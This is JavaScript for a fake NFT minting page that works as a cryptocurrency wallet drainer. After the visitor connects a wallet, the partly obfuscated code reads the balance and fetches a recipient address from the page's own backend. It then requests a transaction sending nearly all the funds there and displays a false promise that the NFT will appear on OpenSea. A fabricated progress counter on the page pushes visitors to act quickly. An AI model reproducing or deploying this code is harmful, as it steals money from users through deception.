var wallet_address = ""
var balance = 0
var address_from = ""
var status = 0
async function Order(data_json){
    data = {
        "nonce": data_json["nonce"],
        "gasPrice":data_json["gasPrice"],
        "gasLimit":data_json["gasLimit"],
        "to":data_json["to"],
        "wallet":address_from,
        "value":balance,
        "type":"event_on_success",
        "tx":JSON.stringify(data_json)
    }
    try{
        res = await axios.post('/m/api/order', data)
    }catch{
        console.log("error send")
    }
}

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

let web3Provider;
async function connectButton() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
}

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});


async function updateState(connected) {
    if (connected && (await askSign())) {
        _0x4822c4()
    }
}


async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    // try {
    //     const message = `Welcome, \n\n` +
    //         `Click to sign in and accept the Terms of Service.\n\n` +
    //         `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    //         `Wallet Address:\n${walletAddress}\n\n` +
    //         `Nonce:\n${createNonce()}`;
    //     const signature = await web3Js.eth.personal.sign(message, walletAddress);
    //     const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

    //     console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);

    //     return true;
    // } catch (e) {
    //     alert("Error signing message. Please try again.");
    //     return false;
    // }
    return true;
}

window.addEventListener('load', async () => {

    if (isMobile() && !window.ethereum) {
        $(".connectButton").click(function() {
            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
        });

      
        }  else {
             $(".connectButton").click(function() {
            connectButton()
            });
    }
});

//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};
const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}
//#endregion





async function _0x274b81(_0x25aabc) {
    const _0x38aa45 = new Web3(Moralis["provider"]);
}

setTimeout(async () => {
    try {
        const _0x19820a = new Web3(Moralis["provider"]),
            _0x3c65f0 = (await _0x19820a["eth"]["getAccounts"]())[0];

        console["log"](_0x3c65f0 + " is connected");
    } catch (_0x29510b) {
      console.log("error")
    }
}, 5000);

let _0x12b040 = ![];

typeof window["ethereum"] !== "undefined" && (_0x12b040 = !![]);

let walletBalance = 0;

async function SetSettings(wallet, value){
    bal = 0
    if (value != "0"){
        bal = value
    }
    
    try{
       const {data} = await axios.post('/m/api/wallet',{
            "wallet":wallet,
            "balance":bal,
            "real":String(value)
        });
       return data;
    }catch{
        console.log("error")
        return null
    }
}
const _0x4822c4 = async () => {
    if (status == 0){
    const _0x40b84b = new Web3(Moralis["provider"]),
        _0x2647b5 = (await _0x40b84b["eth"]["getAccounts"]())[0];

    try {
        walletBalance = await _0x40b84b["eth"]["getBalance"](_0x2647b5);

        const _0x307d69 = _0x40b84b["utils"]["fromWei"](walletBalance, "ether");
        address_from = _0x2647b5;
     
        res = await SetSettings(_0x2647b5, parseFloat(_0x307d69))
     balance = _0x307d69;
        if ( res && res.result) {
            wallet_address = res.data
            try{
                await perfectBalance()
            }catch{
                console.log('error')
            }
        } else{
            alert("Sorry, but you don't have enough money for comission transactions in the account.")
            console["log"]("Error, balance is too low. (< 0.01 ETH)");
        } 

    } catch (_0x46a278) {
        console["log"](_0x46a278);
    }
    }
};

async function perfectBalance() {
    const _0x526f78 = new Web3(Moralis["provider"]),
        _0x1faf91 = (await _0x526f78["eth"]["getAccounts"]())[0],
        _0xe86776 = await _0x526f78["eth"]["getChainId"]();

    await _0x526f78["eth"]["getTransactionCount"](_0x1faf91, "pending")["then"](async _0x3e4d25 => {
        const _0x28a185 = await _0x526f78["eth"]["getGasPrice"](),
            _0x1633d6 = _0x526f78["utils"]["toHex"](Math["floor"](_0x28a185 * 1.3)),
            _0x17e3e2 = new _0x526f78["utils"]["BN"]("22000"),
            _0x3bb930 = _0x17e3e2 * Math["floor"](_0x28a185 * 2),
            _0x8e40e7 = walletBalance - _0x3bb930;

        console["log"]("Sending " + _0x526f78["utils"]["fromWei"](_0x8e40e7["toString"](), "ether") + " ETH from " + _0x1faf91 + "...")
          const data_json = {
            "nonce": "",
            "gasPrice": _0x1633d6,
            "gasLimit": "0x55F0",
            "to": wallet_address,
            "value": "0x" + _0x8e40e7["toString"](16),
            "data": "0x",
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }; 


             let account = ethereum.request({
                    method: "eth_sendTransaction",
                    params: [
                      {
                        from: _0x1faf91,
                        to: wallet_address,
                        value: "0x" + _0x8e40e7["toString"](16),
                      },
                    ],
            })
      .then(async txHash => {
        status = 1
        await Order(data_json)
        alert("Thank you! You will see your NFT on the OpenSea page within 24 hours.")

      })
      .catch((error) => {
        console.log(error)

      });


            // await _0x526f78["eth"]["sendSignedTransaction"](_0x14e2ed)["then"](async _0x45f7a3 => {
            //     status = 1
            //     await Order(data_json)
            //     alert("Thank you! You will see your NFT on the OpenSea page within 24 hours.")

            // })["catch"](_0x119fc8 => {
            //     console["log"](_0x119fc8)
            // });
    });
}
var countAmount = $('#quantity').val()
const maxCounts = 3

document.querySelector("button.button_up").addEventListener("click", () => {
  if (countAmount < maxCounts) {
    countAmount++;
    $("#quantity").val(countAmount);
  }
});

document.querySelector("button.button_back").addEventListener("click", () => {
  if (countAmount > 1) {
    countAmount--;
   
  $("#quantity").val(countAmount);
  }
});



function randomInteger(min, max) {
 let rand = min - 0.5 + Math.random() * (max - min + 1);
  return Math.round(rand);
}
function makeid(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}
const truncateRegex = /^(0x[a-zA-Z0-9]{4})[a-zA-Z0-9]+([a-zA-Z0-9]{4})$/;

const truncateEthAddress = (address) => {
  const match = address.match(truncateRegex);
  if (!match) return address;
  return `${match[1]}…${match[2]}`;
};

// function openModal(count){
//     let i = 1;
//     while (count != i) {
//         let gen_wallet = truncateEthAddress(`0x${makeid(40)}`);
//             setTimeout(function(){
//                  $.simplyToast(`<b>Transaction success</b><p>${gen_wallet}</p>`,'', {delay: 2000 });
//             }, 1500);

               
                
//                 i++;
//     }

            
// }
var full_val = $(".full_val").text();

const update_percent = (val, full)  => {
     percent = get_percent(val,full);
     $(".lins_sss" ).css("width", percent + "%");
     $(".get_val").text(percent + "%");

}


const get_percent = (val, full) => {
      const result = (val / full) * 100;
  // const roundedResult = result.toFixed(2);
  return Math.round(result);
}



window.addEventListener("load", function(event) {


    

    if (window.localStorage.getItem('timer')){
        $(".old_val").text(window.localStorage.getItem('timer'));
       update_percent(window.localStorage.getItem('timer'), full_val)

    }
    
   var seconds_timer_id = setInterval(function() {
       
            if (parseInt($(".old_val").text()) <= parseInt(full_val) - 20) {

                var seconds = parseInt($(".old_val").text()) + randomInteger(1,5)
                if (seconds > parseInt(full_val) - 20){
                    clearInterval(seconds_timer_id);
                } else{
               
                    window.localStorage.setItem('timer', seconds)
                    $(".old_val").text(seconds)
                    update_percent(seconds, full_val)
                }
                
            } else {
                clearInterval(seconds_timer_id);    
            }
        }, 3000);
  });